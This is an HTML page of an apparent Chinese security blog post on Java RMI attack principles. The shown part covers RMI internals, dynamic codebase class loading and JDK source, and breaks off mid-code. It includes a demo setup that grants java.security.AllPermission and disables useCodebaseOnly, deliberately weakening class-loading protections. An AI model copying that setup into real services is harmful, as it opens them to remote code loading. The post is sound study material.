@@ -1,0 +1,3084 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next beep use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="https://cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java安全,RMI," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="RMI学习RMI详解RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java RMI攻击原理分析">
+<meta property="og:url" content="http://1azy.icu/2023/04/03/Java-RMI/index.html">
+<meta property="og:site_name" content="1azysugar的博客">
+<meta property="og:description" content="RMI学习RMI详解RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stu">
+<meta property="og:locale">
+<meta property="og:image" content="http://1azy.icu/images/20230421212615.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422150503.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422002056.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422122640.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422152302.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422125236.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422125919.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422130210.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422135554.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422140145.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422140631.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422140741.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422141008.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422153016.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422152930.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422221002.png">
+<meta property="og:image" content="http://1azy.icu/images/20230422221503.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429222815.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429222941.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429223024.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429223101.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429223140.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429223239.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429225014.png">
+<meta property="og:image" content="http://1azy.icu/images/20230429232356.png">
+<meta property="og:image" content="http://1azy.icu/images/20230430142407.png">
+<meta property="og:image" content="http://1azy.icu/images/20230430144001.png">
+<meta property="og:image" content="http://1azy.icu/images/20230430151950.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200622152129-fd728322-b458-1.png">
+<meta property="og:image" content="http://1azy.icu/images/20230430170309.png">
+<meta property="og:image" content="http://1azy.icu/images/20230430172816.png">
+<meta property="article:published_time" content="2023-04-02T19:16:12.000Z">
+<meta property="article:modified_time" content="2023-06-02T20:29:06.325Z">
+<meta property="article:author" content="1azysugar">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="RMI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1azy.icu/images/20230421212615.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Beep',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":6,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1azy.icu/2023/04/03/Java-RMI/"/>
+
+
+
+<!-- 文章加密 -->
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+		if (history.length === 1) {
+		    window.opener = null;
+		    window.open('', '_self');
+		    window.close();
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+<!-- fontawesome5 -->
+<link href="/lib/font-awesome/css/fontawesome-all.min.css" rel="stylesheet" type="text/css" />
+
+  <title>Java RMI攻击原理分析 | 1azysugar的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/lazysugar" target="_blank"><img style="position: absolute; top: 0; right: 0; border: 0;" src="/images/headband/forkme_right_red.png" alt="Fork me on GitHub"></a>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1azysugar的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">1azysugar的博客</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fas fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fas fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="far fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+    
+    <a href="https://github.com/lazysugar" class="github-corner" target="_blank" title="Follow me on GitHub" aria-label="Follow me on GitHub">
+      <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#222; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+	<path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+      </svg>
+    </a>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1azy.icu/2023/04/03/Java-RMI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1azysugar的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Java RMI攻击原理分析</h2>
+        
+
+        <div class="post-meta">
+	  
+	  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar-plus"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-04-03T03:16:12+08:00">
+                2023-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">java安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <!--<i class="far fa-file-word"></i>-->
+		  <i class="fas fa-book-open"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文共计 &#58;</span>
+                
+                <span title="本文共计">
+                   字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="far fa-clock"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅文耗时 &asymp;</span>
+                
+                <span title="阅文耗时">
+                   min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="RMI学习"><a href="#RMI学习" class="headerlink" title="RMI学习"></a>RMI学习</h1><h2 id="RMI详解"><a href="#RMI详解" class="headerlink" title="RMI详解"></a>RMI详解</h2><p>RMI (Remote Method Invocation) 远程方法调用，是一种调用远程位置的对象来执行方法的思想。为了屏蔽网络通信的复杂性，RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。<br><img src="/images/20230421212615.png"></p>
+<h2 id="过程拆解"><a href="#过程拆解" class="headerlink" title="过程拆解"></a>过程拆解</h2><ol>
+<li><p>创建远程对象。RemoteInterface remote &#x3D; new RemoteInterfaceImpl();</p>
+</li>
+<li><p>注册远程对象。registry.bind(“remote”, remote);</p>
+</li>
+<li><p>客户端访问服务器并查找远程对象。包括两个步骤：</p>
+<p> ①用interface定义要查找的远程对象，在第四步作为引用：RemoteInterface remote &#x3D; (RemoteInterface);</p>
+<p> ②查找远程对象。Naming.lookup(“rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;service”)</p>
+</li>
+<li><p>Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub</p>
+</li>
+<li><p>调用远程方法。remote.sayHello(“ok”)</p>
+</li>
+<li><p>客户端存根和服务器骨架通信</p>
+</li>
+<li><p>骨架代理调用remote.sayHello(“ok”);，实际上是在Server端调用的</p>
+</li>
+<li><p>骨架把结果返回给存根</p>
+</li>
+<li><p>存根把结果返回给客户端</p>
+</li>
+</ol>
+<p>代码实现：</p>
+<p>定义一个能够远程调用的接口，继承 java.rmi.Remote 接口，这个接口中的所有方法都必须声明抛出 java.rmi.<br>RemoteException 异常</p>
+<pre><code>import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface RemoteInterface extends Remote &#123;
+    public String sayHello(String name) throws RemoteException;
+&#125;
+</code></pre>
+<p>创建这个远程接口的实现类，这个类中是真正的执行逻辑代码，并且继承 java.rmi.server.UnicastRemoteObject 类,童谣所有方法抛出RemoteException</p>
+<blockquote>
+<p>在RMI中 UnicastRemoteObject类是与Object超类等效的,该类提供了equals( ) , hashcode( ), toString( )方法,继承UnicastRemoteObject类的子类在 export 时，会随机绑定一个端口，开始监听来自客户端（Stubs）的请求，即使不注册，直接请求这个端口也可以通信。如果不想让远程对象成为 UnicastRemoteObject 的子类，后面就需要主动的使用其静态方法 exportObject 来手动 export 对象。</p>
+</blockquote>
+<pre><code>import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
+    protected RemoteInterfaceImpl() throws RemoteException &#123;
+        super();
+    &#125;
+
+    @Override
+    public String sayHello(String name) throws RemoteException &#123;
+        return &quot;Hello &quot; + name;
+    &#125;
+&#125;
+</code></pre>
+<h3 id="RMI-registry"><a href="#RMI-registry" class="headerlink" title="RMI registry"></a>RMI registry</h3><p>Java RMI 设计了一个 注册表 （RMI registry） 的思想，当想要调用某个远程对象的方法时，通过该远程对象在注册时提供在注册表（registry）中的别名（Name），来让注册表（registry）返回该远程对象的引用，后续通过该引用实现远程方法调用。由 java.rmi.registry.Registry 和 java.rmi.Naming 来实现。</p>
+<p>Naming 提供了查询（lookup）、绑定（bind）、重新绑定（rebind）、接触绑定（unbind）、list（列表）用来对注册表进行操作。这个类提供的每个方法都有一个 URL 格式的参数，格式如下： <strong>&#x2F;&#x2F;host:port&#x2F;name</strong>：</p>
+<ul>
+<li>host 表示注册表所在的主机</li>
+<li>port 表示注册表接受调用的端口号，默认为 1099</li>
+<li>name 表示一个注册 Remote Object 的引用的名称，不能是注册表中的一些关键字</li>
+</ul>
+<p>从下面的java.rmi.Naming#lookup源码可以看出，这些方法调用 <strong>LocateRegistry.getRegistry</strong> 方法获取了 Registry 接口的实现类，并调用其相关方法进行实现的</p>
+<pre><code>public static Remote lookup(String name)
+    throws NotBoundException,
+        java.net.MalformedURLException,
+        RemoteException
+&#123;
+    ParsedNamingURL parsed = parseURL(name);
+    Registry registry = getRegistry(parsed);
+
+    if (parsed.name == null)
+        return registry;
+    return registry.lookup(parsed.name);
+&#125;
+</code></pre>
+<p>使用 LocateRegistry#createRegistry() 方法来创建注册中心,将待调用的类进行绑定:</p>
+<pre><code>import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.rmi.Naming;
+
+public class RMIService &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        // 创建一个rmi映射表
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 创建一个对象
+        RemoteInterface remote = new RemoteInterfaceImpl();
+        // 将对象绑定到rmi注册表
+        registry.bind(&quot;remote&quot;, remote);
+
+    &#125;
+&#125;
+</code></pre>
+<p>Client端进行调用，</p>
+<pre><code>import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.util.Arrays;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        Registry registry_remote = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);
+        System.out.println(Arrays.toString(registry_remote.list()));
+
+        RemoteInterface remote = (RemoteInterface)registry_remote.lookup(&quot;remote&quot;);
+        RemoteInterface remote2 = new RemoteInterfaceImpl();
+        registry_remote.bind(&quot;remote2&quot;,remote2);
+        System.out.println(remote.sayHello(&quot;ok&quot;));
+    &#125;
+
+&#125;
+</code></pre>
+<p>先运行RMIService，之后启动RMIClient端，成功调用了远程对象的方法。<br><img src="/images/20230422150503.png"></p>
+<p>注意我们此时remote.sayHello(“ok”);传递的是String，如果我们想要传递一个类就需要知道两个概念</p>
+<ol>
+<li>RMI的动态加载类，java.rmi.server.codebase</li>
+<li>Java SecurityManager安全管理机制</li>
+</ol>
+<h3 id="RMI动态加载类"><a href="#RMI动态加载类" class="headerlink" title="RMI动态加载类"></a>RMI动态加载类</h3><p>如果客户端在调用时，传递一个可序列化的对象作为参数进行传输时，在Server端肯定会对其进行反序列化。</p>
+<ul>
+<li>如果JVM有这个类则调用</li>
+<li>如果这个对象在服务端不存在，一般服务端会抛出 ClassNotFound 的异常，但是 RMI 支持动态类加载，它可以通过远程URL去下载这个类。那么这个URL可以是http、ftp协议，加载时可以加载某个第三方类库jar包下的类，或者在指定URL时在最后以\结束来指定目录，从而通过类名加载该目录下的指定类。</li>
+</ul>
+<p>通过设置 <strong>java.rmi.server.codebase</strong>，则会尝试从其中的地址获取 .class 并加载及反序列化。可使用 <strong>System.setProperty(“java.rmi.server.codebase”, “<a target="_blank" rel="noopener" href="http://127.0.0.1:9999/">http://127.0.0.1:9999/</a>“);</strong> 进行设置，或使用启动参数 <strong>-Djava.rmi.server.codebase&#x3D;”<a target="_blank" rel="noopener" href="http://127.0.0.1:9999/">http://127.0.0.1:9999/</a>“</strong> 进行指定。</p>
+<h3 id="Java-SecurityManager安全管理机制"><a href="#Java-SecurityManager安全管理机制" class="headerlink" title="Java SecurityManager安全管理机制"></a>Java SecurityManager安全管理机制</h3><blockquote>
+<p>当运行未知的Java程序的时候，该程序可能有恶意代码（删除系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行的代码的权限进行控制，这时候就要启用Java安全管理器。该管理器默认是关闭的。</p>
+</blockquote>
+<p>而在RMI中进行动态加载类时有一个限制[1]为：</p>
+<p>需要设置RMISecurityManager作为安全管理器(SecurityManager)，这样RMI时才会动态加载类。</p>
+<pre><code>System.setSecurityManager(new RMISecurityManager());
+</code></pre>
+<p>同时需要给定一个管理策略文件，该文件以.policy结尾，内容如下可以给定全部权限</p>
+<pre><code>grant &#123;
+    permission java.security.AllPermission;
+&#125;;
+</code></pre>
+<p>之后可通过读取静态资源文件的方式加载该管理策略</p>
+<pre><code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());
+</code></pre>
+<p>那么还有一个限制[2]为：</p>
+<blockquote>
+<p>属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>
+</blockquote>
+<p>动态加载类主要是分为两个场景，角色分别为Client和Server</p>
+<ol>
+<li>Client端接受通过RMI远程调用Server端某个方法产生的返回值，但是该返回值是个对象且Client端并没有该对象的类，那么就可以通过Server端提供的URL去动态加载类。</li>
+<li>Server端在RMI过程中收到Client端传来的参数，该参数可能是个对象，如果该对象对应的类在Server端并不存在，那么就可以通过Client端提供的URL去动态加载类</li>
+</ol>
+<h3 id="场景一：Client端动态加载Server端Obj"><a href="#场景一：Client端动态加载Server端Obj" class="headerlink" title="场景一：Client端动态加载Server端Obj"></a>场景一：Client端动态加载Server端Obj</h3><p>RemoteInterface.java</p>
+<pre><code>import java.rmi.Remote;
+import java.rmi.RemoteException;
+
+public interface RemoteInterface extends Remote &#123;
+    public String sayHello(String name) throws RemoteException;
+
+    String sayServerLoadClient(Object name) throws RemoteException;
+
+    Object sayClientLoadServer() throws RemoteException;
+&#125;
+</code></pre>
+<p>RemoteInterfaceImpl.java</p>
+<pre><code>import java.rmi.RemoteException;
+import java.rmi.server.UnicastRemoteObject;
+
+public class RemoteInterfaceImpl extends UnicastRemoteObject implements RemoteInterface &#123;
+    protected RemoteInterfaceImpl() throws RemoteException &#123;
+        super();
+    &#125;
+
+    @Override
+    public String sayHello(String name) throws RemoteException &#123;
+        return &quot;Hello &quot; + name;
+    &#125;
+
+    @Override
+    public String sayServerLoadClient(Object name) throws RemoteException &#123;
+        return name.getClass().getName();
+    &#125;
+
+    @Override
+    public Object sayClientLoadServer() throws RemoteException &#123;
+        return new ServerObject();
+    &#125;
+&#125;
+</code></pre>
+<p>Server端待动态加载的类ServerObject.java</p>
+<pre><code>import java.io.Serializable;
+
+public class ServerObject implements Serializable &#123;
+    private static final long serialVersionUID = 3274289574195395731L;
+&#125;
+</code></pre>
+<p>RMIService.java</p>
+<pre><code>import java.rmi.Naming;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RMIService &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://localhost:8080/&quot;);
+        // 创建一个rmi映射表
+        Registry registry = LocateRegistry.createRegistry(1099);
+        // 创建一个对象
+        RemoteInterface remote = new RemoteInterfaceImpl();
+//        registry.bind(&quot;rmi://localhost:1099/remote&quot;,remote);
+        // 将对象绑定到rmi注册表
+        Naming.bind(&quot;rmi://localhost:1099/remote&quot;, remote);
+
+    &#125;
+&#125;
+</code></pre>
+<p>RMIClient.java</p>
+<pre><code>import com.study.jndi_rmi_object_injection.RemoteInterface;
+
+import javax.naming.Context;
+import javax.naming.InitialContext;
+import java.rmi.RMISecurityManager;
+import java.util.Properties;
+
+public class RMIClient &#123;
+    public static void main(String[] args) throws Exception&#123;
+
+        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
+        Properties env = new Properties();
+        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);
+        env.put(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);
+
+        //设置java.security.policy属性值与RMISecurityManager
+        System.setProperty(&quot;java.security.policy&quot;, RMIClient.class.getClassLoader().getResource(&quot;rmi.policy&quot;).getFile());
+        System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;,&quot;false&quot;);
+        System.setSecurityManager(new RMISecurityManager());
+
+        // 创建初始化环境
+        Context ctx = new InitialContext(env);
+        //  jndi的方式获取远程对象
+        RemoteInterface remote = (RemoteInterface) ctx.lookup(&quot;rmi://localhost:1099/remote&quot;);
+
+
+        // 调用远程对象的方法
+        System.out.println(remote.sayHello(&quot;ok&quot;));
+        //加载Server端Obj
+        System.out.println(&quot;The Class Name: &quot; + remote.sayClientLoadServer().getClass().getName());
+    &#125;
+
+&#125;
+</code></pre>
+<p><img src="/images/20230422002056.png"></p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><ol>
+<li>服务注册<br>① 远程对象创建<br>创建了一个远程对象:RemoteInterface remote &#x3D; new RemoteInterfaceImpl();这个对象继承了UnicastRemoteObject类，在初始化的时候会调用父类的构造器，实例化时会创建一个UnicastServerRef对象并调用其exportObject</li>
+</ol>
+<p><img src="/images/20230422122640.png"></p>
+<p>其中sun.rmi.server.Util#createProxy()会调用createStub返回RemoteObjectInvocationHandler处理器处理的RemoteInterface接口实例的动态代理实例，<br><img src="/images/20230422152302.png"><br> 然后创建 sun.rmi.transport.Target 对象，这个 Target 对象封装了我们远程执行方法和Stub<br><img src="/images/20230422125236.png"><br>调用LiveRef#exportObject调用TCPEndpoint#exportObject调用this.listen()开始监听<br><img src="/images/20230422125919.png"><br>然后调用Transport#exportObject,将Target实例putTarget到ObjectTable中<br><img src="/images/20230422130210.png"><br>ObjectTable 用来管理所有发布的服务实例 Target<br>，ObjectTable 提供了根据ObjectEndpoint、Remote实例来获取Target方法</p>
+<pre><code>private static final Map&lt;ObjectEndpoint, Target&gt; objTable = new HashMap();
+private static final Map&lt;WeakRef, Target&gt; implTable = new HashMap();
+
+    static Target getTarget(ObjectEndpoint var0) &#123;
+    synchronized(tableLock) &#123;
+        return (Target)objTable.get(var0);
+    &#125;
+&#125;
+
+public static Target getTarget(Remote var0) &#123;
+    synchronized(tableLock) &#123;
+        return (Target)implTable.get(new WeakRef(var0));
+    &#125;
+&#125;
+</code></pre>
+<p>②注册中心创建<br>（1）new RegistryImpl(port)<br>（2）创建LiveRef对象，ep为TCPEndpoint对象包含本地ip、端口等信息<br><img src="/images/20230422135554.png"><br>封装到new UnicastServerRef对象，传递给setup方法<br><img src="/images/20230422140145.png"><br>（3）调用UnicastServerRef#exportObject，其中Util.createProxy会创建Stub存根，this.setSkeleton(var1)会创建Skeleton骨架<br><img src="/images/20230422140631.png"><br>封装为一个Target对象var6，执行this.ref.exportObject(var6)<br><img src="/images/20230422140741.png"><br>(4)调用this.listen()开始监听，创建Socket服务开启监听,调用super.exportObject(),将target添加到objTable<br><img src="/images/20230422141008.png"><br>(5)接收与处理请求</p>
+<p>注册中心与远程服务对象注册的大部分流程相同，差异在：</p>
+<ul>
+<li>远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel</li>
+<li>远程对象默认随机端口，注册中心默认是 1099（当然也可以指定）</li>
+</ul>
+<p>③ 服务注册<br>经过了一个checkAccess的检测(checkAccess就是为了检查绑定时是否是在同一个服务器上。)之后就把服务加入了this.bindings里了。<br><img src="/images/20230422153016.png"></p>
+<blockquote>
+<p>在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功。<br><img src="/images/20230422152930.png"></p>
+</blockquote>
+<ol start="2">
+<li>服务发现</li>
+</ol>
+<h2 id="JRMI协议源码详解"><a href="#JRMI协议源码详解" class="headerlink" title="JRMI协议源码详解"></a>JRMI协议源码详解</h2><p>进入Service中的listen()方法，先调用newServerSocket方法，创建一个Serversocket，若传入的port是0，则系统会自动分配一个随机端口。然后开启了一个新线程并用上面创建的socket初始化了AcceptLoop，我们跟进AcceptLoop的run()方法.</p>
+<pre><code>server = ep.newServerSocket();
+/*
+    * Don&#39;t retry ServerSocket if creation fails since
+    * &quot;port in use&quot; will cause export to hang if an
+    * RMIFailureHandler is not installed.
+    */
+Thread t = AccessController.doPrivileged(
+    new NewThreadAction(new AcceptLoop(server),
+                        &quot;TCP Accept-&quot; + port, true));
+t.start();
+</code></pre>
+<p>跟进方法TCPTransport.AcceptLoop#run-&gt;TCPTransport.AcceptLoop#executeAcceptLoop，看到accept()函数，serversockt会停在这等待连接，当客户端连接后它又创建了一个新的线程，我们继续跟进ConnectionHandler。</p>
+<pre><code>socket = serverSocket.accept();
+
+/*
+    * Find client host name (or &quot;0.0.0.0&quot; if unknown)
+    */
+InetAddress clientAddr = socket.getInetAddress();
+String clientHost = (clientAddr != null
